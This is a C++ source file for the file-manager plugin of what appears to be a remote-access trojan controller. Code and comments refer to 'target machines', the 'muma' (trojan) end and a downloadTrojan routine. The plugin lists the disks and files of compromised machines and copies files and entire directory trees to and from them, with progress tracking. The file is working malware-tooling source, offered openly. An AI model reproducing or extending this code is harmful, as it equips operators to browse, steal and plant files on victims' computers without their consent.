#include "stdafx.h"
#include "RemotePlugin.h"
#include "resource.h"
#include "RemoteExplorer.h"
#include "macro.h"
#include "conn.h"
#include <process.h>

STANDARDDATA g_STData;
STANDARDDATA g_LastSTData;
char g_Path[MAX_PATH];
char g_LastPath[MAX_PATH];

static HANDLE m_hListenThread;
static unsigned int	m_ListenThreadId;


int RemotePlugin::DetachPathAndFile(const char* fullName, char* path, char* name)
{
	int n = strlen(fullName);
	int nLen = n;
	if(fullName[nLen-1] == '\\')//如果本身是目录且最后带"\\"则去除之
	{
		nLen--;
		n--;
	}

	for(; nLen >= 1; nLen--)//寻找此目录或文件所在的父目录
	{
		if(fullName[nLen-1] == '\\')
		{
			break;
		}
	}
	if(nLen == 0 && name)
	{
		strncpy(name, fullName, n);
		name[n] = 0;
		return 0;
	}

	if(path)
	{
		strncpy(path, fullName, nLen-1);
		path[nLen-1] = 0;
	}
	if(name)
	{
		strncpy(name, fullName+nLen, n-nLen);
		name[n-nLen] = 0;
	}
	return 0;
}

RemotePlugin::RemotePlugin()
{
	strcpy(m_plugInfo.sAuthor,_T("greatyao"));
	strcpy(m_plugInfo.sName,_T("文件管理"));
	strcpy(m_plugInfo.sDesc,_T("远程文件和目录管理"));
	m_plugInfo.uReserved = 0x0100;
}

RemotePlugin::~RemotePlugin()
{
}


void RemotePlugin:: OnCreateDocTemplate()
{
	m_docTemp = new CMultiDocTemplate(
		GetMinResId() + 1,
		RUNTIME_CLASS(PluginDoc),
		RUNTIME_CLASS(CMDIChildWnd),
		RUNTIME_CLASS(RemoteExplorer));
	ISite::AddDocTemplate(m_docTemp);
}


void RemotePlugin::OnCreateFrameMenu(CMenu* pMenu)
{
	pMenu->GetSubMenu(2)->AppendMenu(MF_STRING,GetMinResId() + 2, "文件管理");
}

void RemotePlugin::OnCreateFrameToolBar(ToolBarData* pArr,UINT& count)
{
	pArr->uIconId = IDB_BMP_FILEMGR;
	pArr->uId = GetMinResId() + 2;
	strcpy(pArr->sName, "文件管理");
	strcpy(pArr->sTip, "远程文件和目录管理");
	count = 1;
}

void RemotePlugin::OnCommand(UINT uId)
{
	if (uId == GetMinResId() + 2)
	{
		ISite::CreateFrameWnd(m_docTemp, RUNTIME_CLASS(RemoteExplorer), "远程文件管理");

		if(g_LastSTData.s == 0 || g_LastSTData.s != g_STData.s)
			OnRedirectDir("./");
	}
}

void RemotePlugin::OnCreateDockPane(DockPane* pArr,UINT& count)
{	
	count = 0;
}

void RemotePlugin::OnNotify(UINT id, WPARAM wp, LPARAM lp)
{
	if(wp == NULL)	return;

	RemoteExplorer* pView = NULL;
	POSITION posdoc = m_docTemp->GetFirstDocPosition();
	if(posdoc)
	{
		CDocument* pdoc = m_docTemp->GetNextDoc(posdoc);
		POSITION posview = pdoc->GetFirstViewPosition();
		pView = (RemoteExplorer*)(pdoc->GetNextView(posview));
	}

	
	if(id == ZCM_SEL_OBJ)//选择了新的目标机
	{
		STANDARDDATA* curData = (STANDARDDATA*)wp;
		memcpy(&g_STData, curData, sizeof(STANDARDDATA));
		if( pView && g_STData.s != g_LastSTData.s)
		{
			memcpy(&g_LastSTData, &g_STData, sizeof(STANDARDDATA));
			if(IsCurrentWorking()) OnRedirectDir("./");
		}
	}
	else if(IsCurrentWorking() == false)//当前插件不在前端	
		return;
	else if(id == ZCM_WM_OFFLINE)//目标机下线	   
	{
		STANDARDDATA* pSD = (STANDARDDATA*)wp;
		if(g_STData.s == pSD->s)
		{
			g_STData.bOnlineFlag = false;
			g_STData.s = 0;
		}
	}
	else if(id == ZCM_WM_MSG_ONLINE)//目标机上线
	{
		if(g_STData.s == 0)//第一台上线的目标机
		{
			STANDARDDATA* curData = (STANDARDDATA*)wp;
			memcpy(&g_STData, curData, sizeof(STANDARDDATA));
			g_STData.bOnlineFlag = true;
		}
	}
	else if(id == ZCM_RECV_MSG)//收到目标机的发送回来的消息
	{
		DispatchData* data = (DispatchData*)wp;
		control_header* header = data->recvData.header;
		unsigned short cmd = header->command;
		unsigned short resp = header->response;

		if(!pView || cmd < CONTROL_ENUM_DISKS || cmd >= CONTROL_ENUM_PROCS)			
			return;

		if(resp != 0)	
		{
			pView->OnFileOperationFailed(cmd, resp);
			return;
		}

		strcpy(g_Path, g_LastPath);
		if(cmd == CONTROL_ENUM_DISKS || cmd == CONTROL_ENUM_FILES || cmd == CONTROL_SEARCH_FILE)
			pView->InsertItem(wp, NULL);
		else pView->OnFileOperationCompleted(cmd);
	}
	else if(id == ZCM_WM_UPLOAD_DOWNLOAD)
	{
		CreateUpDownFileThread(wp); 
	}
}

BOOL RemotePlugin::OnInitalize()
{
	return TRUE;
}

BOOL RemotePlugin::OnUninitalize()
{
	return TRUE;
}

void RemotePlugin::OnCommandUI(CCmdUI* pCmdUI)
{

}


void RemotePlugin::OnRedirectDir(const char* dirPath)
{
	int cmd;
	char* body = 0;
	int len = 0;
	void* s = g_STData.s;
	
	if(strcmp("./", dirPath) == 0)
		cmd = CONTROL_ENUM_DISKS;
	else
	{
		cmd = CONTROL_ENUM_FILES;
		body = (char*)dirPath;
		len = strlen(dirPath);
	}
	strcpy(g_LastPath, dirPath);
	ISite::SendCmd(cmd, s, body, len);
}

void RemotePlugin::OnFileOperation(unsigned short cmd, void* body, int len)
{
	ISite::SendCmd(cmd, g_STData.s, (char*)body, len);
}

static unsigned __stdcall downloadTrojan(void* p)
{
	DispatchData* param = (DispatchData*)p;
	DispatchData data;  memcpy(&data, param, sizeof(data));
	CWnd* progressDlg = NULL;
	union fileop_info info; memcpy(&info, param->recvData.body, sizeof(info));
	int nStatus = 0;
	char* thisDir = info.ftpInfo.clientFile;
	char remoteDir[MAX_PATH] = {0}, thisFile[MAX_PATH] = {0};
	__int64 startStamp = (__int64)time(NULL), lastStamp = startStamp, nowStamp;
	__int64 totalSize = 0;
	conn ftpfd = data.s;
	int flags = 0;//param->recvData.port == CONN_HTTP_SERVER ? 0 : 1;
	
	KDebug("Step1: Download  %s---> %s", info.ftpInfo.trojanFile, thisDir);
	SetEvent(info.ftpInfo.event);
	
	strcat(thisDir, "\\");
	SetCurrentDirectoryA(thisDir);

	progressDlg = ISite::CreateProgressDlg(1);
	RemotePlugin::DetachPathAndFile(info.ftpInfo.trojanFile, remoteDir, NULL);
	ISite::SetSource(progressDlg, remoteDir);
	ISite::SetDestination(progressDlg, thisDir);

	int nRead = 0;
	while(1)
	{
		control_header header;
		nRead = data.readFunction(ftpfd, (char*)&header, sizeof(header), 0, 0, flags);
		if(nRead <= 0){KDebug("failed to recv control %d", conn_error);nStatus = -1; goto leave; }

		KDebug("recv file cmd 0x%3x", header.command);

		switch(header.command)
		{
		case CONTROL_CREATE_DIR:
			{
				dir_info info;
				if(data.readFunction(ftpfd, (char*)&info, sizeof(info), 0, 0, flags) > 0)
				{
					KDebug("recv create dir %s\n", info.name);
					CreateDirectoryA(info.name, NULL);
					ISite::SetSubDir(progressDlg, info.name);
				}
				break;
			}
		case CONTROL_INFO_FILE:
			{
				dir_info info;
				if(data.readFunction(ftpfd, (char*)&info, sizeof(info), 0, 0, flags) > 0)
				{
					__int64 size = ((__int64)info.fileSizeHigh << 32) + info.fileSizeLow;
					KDebug("recv create file %s size %lld", info.name, size);
					RemotePlugin::DetachPathAndFile(info.name, NULL, thisFile);
					ISite::SetTransFile(progressDlg, thisFile);
					ISite::SetSize(progressDlg, size);

					HANDLE fd = CreateFileA(info.name, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
						CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					__int64 allSize = 0;
					char buf[1024];
					int writeSize;
					int readOnce = sizeof(buf);
					while(allSize < size)
					{
						if(readOnce > size - allSize)
							readOnce = size - allSize;
						nRead = data.readFunction(ftpfd, buf, readOnce, 0, sizeof(buf), flags);
						if(nRead < 0)
						{
							KDebug("read error, till now read %lld bytes, continue", allSize);
							nStatus = -1; 
							break;
						}

						nowStamp = (__int64)time(NULL);
						allSize += nRead;
						totalSize += nRead;
						if(nowStamp > lastStamp)
						{
							__int64 timeDoing = nowStamp-startStamp;
							__int64 speed = totalSize/timeDoing;
							__int64 timeToGo = (size-allSize)/speed;

							ISite::SetSpeed(progressDlg, speed);
							ISite::SetSpeed(progressDlg, timeToGo, 1);
							lastStamp = nowStamp;
						}

						if(allSize % (1024*1024) == 0 || nRead == 0)
							ISite::SetProgress(progressDlg, allSize);

						if(fd != INVALID_HANDLE_VALUE)
							WriteFile(fd, buf, nRead, (LPDWORD)&writeSize, NULL);
					}
					if(fd != INVALID_HANDLE_VALUE) CloseHandle(fd);
				}
				break;
			}
		case CONTROL_END_TRANSFER:
			{
				DispatchData data;
				control_header header = INITIALIZE_HEADER(CONTROL_END_TRANSFER);
				memset(&data, 0, sizeof(data));
				data.recvData.header = &header;
				ISite::Notify(ZCM_RECV_MSG, (WPARAM)&data, NULL);
				goto leave;
				break;
			}
		default:
			break;
		}
	}

leave:
	KDebug("Step4: Leave %s", __FUNCTION__);	
	ISite::DestoryDlg(progressDlg);
	conn_close(ftpfd);
	return nStatus;
}

struct progress_struct
{
	__int64 startStamp, lastStamp, nowStamp;
	__int64 totalSize;
};

static int uploadFile(conn s, int (*WriteFunction)(void*, char*, char*, int, int), const char* fileName,
					  CWnd* progressDlg, progress_struct& progress)
{
	control_header header = INITIALIZE_HEADER(CONTROL_INFO_FILE);
	dir_info fileinfo;
	char name[MAX_PATH] = {0};
		
	KDebug("uploadFile %s", fileName);
	RemotePlugin::DetachPathAndFile(fileName, NULL, name);
	ISite::SetTransFile(progressDlg, name);

	HANDLE fd = CreateFileA(fileName, GENERIC_READ,FILE_SHARE_READ, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(fd == INVALID_HANDLE_VALUE)
	{
		KDebug("CreateFileA Error %d", GetLastError());
		return -1;
	}

	LARGE_INTEGER size = { 0,0 };
	size.LowPart = GetFileSize(fd, (unsigned long*)&size.HighPart);
	memset(&fileinfo, 0, sizeof(fileinfo));
	fileinfo.fileSizeHigh = size.HighPart;
	fileinfo.fileSizeLow = size.LowPart;
	strcpy(fileinfo.name, fileName);
	fileinfo.fileType = IS_FILE;
	header.dataLen = sizeof(fileinfo);

	//通知文件大小
	WriteFunction(s, (char*)&header, (char*)&fileinfo, sizeof(fileinfo), header.isCompressed);
	
	//发送文件具体数据
	__int64 allSize = 0, totalSize = ((__int64)size.HighPart << 32) + size.LowPart;
	if(totalSize == 0)	return 0;
	int read_count = 0;
	ISite::SetSize(progressDlg, totalSize);
	char buf[1024] = {0};
	do{
		if(ReadFile(fd, buf,sizeof(buf), (LPDWORD)&read_count, NULL) == 0)
		{
			KDebug("readFile Error %d", GetLastError());
			for(; allSize < totalSize; )
			{
				int writeOnce = sizeof(buf);
				if((totalSize - allSize) < writeOnce)	writeOnce = totalSize - allSize; 
				WriteFunction(s, NULL, buf, writeOnce, 0);
				allSize += writeOnce;
			}
			return -1;
		}

		allSize += read_count;
		progress.nowStamp = (__int64)time(NULL);
		progress.totalSize += read_count;
		if(progress.nowStamp > progress.lastStamp)
		{
			__int64 timeDoing = progress.nowStamp-progress.startStamp;
			__int64 speed = progress.totalSize/timeDoing;
			__int64 timeToGo = (totalSize-allSize)/speed;
			
			//设置传送速度和剩余时间
			ISite::SetSpeed(progressDlg, speed);
			ISite::SetSpeed(progressDlg, timeToGo, 1);
			progress.lastStamp = progress.nowStamp;
		}

		if(allSize % (1024*1024) == 0 || read_count == 0)
		{
			KDebug("processing %.3f MiB of file %s", 1.0*allSize/(1024*1024), fileName);
			ISite::SetProgress(progressDlg, allSize);
			Sleep(35);
		}
		if(read_count == 0)	break;
		
		int nWrite = WriteFunction(s, NULL, buf, read_count, 0);
		if(nWrite <= 0)	break;
	}while(1);
	CloseHandle(fd);

	return 0;
}

static int uploadDir(conn s,  int (*WriteFunction)(void*, char*, char*, int, int), const char* dirName,
					 CWnd* progressDlg, progress_struct& progress)
{
	KDebug("uploadDir %s\n", dirName);
	control_header header = INITIALIZE_HEADER(CONTROL_CREATE_DIR);
	dir_info info;

	memset(&info, 0, sizeof(info));
	strcpy(info.name, dirName);
	info.fileType = IS_DIR;
	header.dataLen = sizeof(info);
	ISite::SetSubDir(progressDlg, dirName);

	//通知muma端创建目录
	WriteFunction(s, (char*)&header, (char*)&info, sizeof(info), header.isCompressed);
	
	WIN32_FIND_DATAA wfd;
	HANDLE h;
	char pattern[MAX_PATH];
	sprintf(pattern, "%s\\*.*", dirName);
	if( (h = FindFirstFileA(pattern, &wfd)) == INVALID_HANDLE_VALUE)
	{
		printf("FindFirstFile error");
		if(ERROR_NO_MORE_FILES != GetLastError())
		{
			return -1;
		}
	}

	//递归下载子目录和文件
	do{
		if (!strcmp(wfd.cFileName, ".") || !strcmp(wfd.cFileName, ".."))
			continue;

		if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			char newDir[MAX_PATH];
			sprintf(newDir, "%s\\%s", dirName, wfd.cFileName);
			KDebug("subdir %s\n", newDir);
			uploadDir(s, WriteFunction, newDir, progressDlg, progress);
		}
		else
		{
			char newFile[MAX_PATH];
			sprintf(newFile, "%s\\%s", dirName, wfd.cFileName);
			KDebug("subFile %s", newFile);
			uploadFile(s, WriteFunction, newFile, progressDlg, progress);
			Sleep(33);
		}
	}while(FindNextFileA(h, &wfd));

	FindClose(h);

	return 0;
}

static unsigned __stdcall uploadThread(void* p)
{
	DispatchData* param = (DispatchData*)p;
	CWnd* progressDlg = NULL;
	DispatchData data;  memcpy(&data, param, sizeof(data));
	union fileop_info info; memcpy(&info, param->recvData.body, sizeof(info));
	int nStatus = 0;
	unsigned long attr;
	char* thisFileOrDir = info.ftpInfo.clientFile;
	char thisParentDir[256], fileOrDirWithoutPath[256];
	control_header header;
	progress_struct progress = {time(NULL), time(NULL),time(NULL), 0};
	conn ftpfd = data.s;
	int flags = param->recvData.port == CONN_HTTP_SERVER ? 0 : 1;

	KDebug("Step1: Upload  %s---> %s", info.ftpInfo.clientFile, info.ftpInfo.trojanFile);
	SetEvent(info.ftpInfo.event);
	
	nStatus = RemotePlugin::DetachPathAndFile(thisFileOrDir, thisParentDir, fileOrDirWithoutPath);
	if(nStatus < 0)	goto leave;

	attr = GetFileAttributesA(thisFileOrDir);
	if(attr == -1)//文件或者目录不存在
	{
		nStatus = -1;
		goto leave;
	}

	strcat(thisParentDir, "\\");
	SetCurrentDirectoryA(thisParentDir);

	KDebug("Step3: %s now work", __FUNCTION__);
	progressDlg = ISite::CreateProgressDlg(/*MyProgress::UPLOAD*/0);
	
	ISite::SetSource(progressDlg, thisParentDir);
	ISite::SetDestination(progressDlg, info.ftpInfo.trojanFile);
	
	if( attr & FILE_ATTRIBUTE_DIRECTORY)
		nStatus = uploadDir(ftpfd, data.WriteFunction, fileOrDirWithoutPath, progressDlg, progress);
	else
		nStatus = uploadFile(ftpfd, data.WriteFunction, fileOrDirWithoutPath, progressDlg, progress);

leave:
	KDebug("Step4: Leave %s", __FUNCTION__);
	REASSIGN_HEADER(header, CONTROL_END_TRANSFER, nStatus);
	data.WriteFunction(ftpfd, (char*)&header, NULL, 0, header.isCompressed);

	//if(nStatus == 0)
	{
		DispatchData data;
		control_header header = INITIALIZE_HEADER(CONTROL_END_TRANSFER);
		header.response = nStatus;
		memset(&data, 0, sizeof(data));
		data.recvData.header = &header;
		ISite::Notify(ZCM_RECV_MSG, (WPARAM)&data, NULL);
	}

	ISite::DestoryDlg(progressDlg);
	return nStatus;
}


int RemotePlugin::CreateUpDownFileThread(WPARAM wp)
{
	DispatchData* data = (DispatchData*)wp;
	control_header* header = data->recvData.header;
	unsigned short int cmd = header->command;
	fileop_info info;

	data->readFunction(data->s, (char*)&info, sizeof(info), 0, 0, 0);
	KDebug("Step0: %s %x", __FUNCTION__, cmd);
	
	info.ftpInfo.event = CreateEventA(NULL, FALSE, FALSE, NULL);
	data->recvData.body = &info;

	HANDLE hThread;
	unsigned threadID;
	if(cmd == CONTROL_UPLOAD_FILE)
		hThread = (HANDLE)_beginthreadex(NULL, 0, uploadThread, data, 0, &threadID);
	else if(cmd == CONTROL_DOWNLOAD_FILE)
		hThread = (HANDLE)_beginthreadex(NULL, 0, downloadTrojan, data, 0, &threadID);
	else
		hThread = NULL;
		
	 if(hThread == NULL)	return -1;
	
	WaitForSingleObject((HANDLE)info.ftpInfo.event, INFINITE);
	CloseHandle((HANDLE)info.ftpInfo.event);
	KDebug("Step2: %s completed", __FUNCTION__);

	return 0;
}
